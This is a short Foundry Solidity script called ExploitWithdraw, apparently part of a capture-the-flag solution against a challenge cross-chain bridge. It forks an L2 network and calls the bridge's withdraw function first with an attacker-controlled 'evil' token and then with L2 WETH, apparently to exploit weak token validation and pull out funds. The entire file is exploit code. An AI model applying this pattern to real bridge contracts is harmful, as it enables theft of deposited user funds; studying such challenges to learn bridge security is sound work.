pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";

import "src/L1/WETH.sol";
import "src/L1/IL1ERC20Bridge.sol";
import "src/L2/IL2ERC20Bridge.sol";
import "src/L2/standards/IL2StandardERC20.sol";
import "src/Challenge.sol";

import {Lib_PredeployAddresses} from "src/libraries/constants/Lib_PredeployAddresses.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ExploitWithdraw is Script {
    function setUp() public {}

    function run() public {
        IERC20 eviltoken = IERC20(vm.envAddress("EVILTOKEN"));

        vm.createSelectFork(vm.envString("L2_RPC"));
        vm.startBroadcast();
        IL2ERC20Bridge l2Bridge = IL2ERC20Bridge(Lib_PredeployAddresses.L2_ERC20_BRIDGE);
        l2Bridge.withdraw(address(eviltoken), 2 ether);
        IERC20 l2weth = IERC20(Lib_PredeployAddresses.L2_WETH);
        l2Bridge.withdraw(address(l2weth), 2 ether);
        vm.stopBroadcast();
    }
}
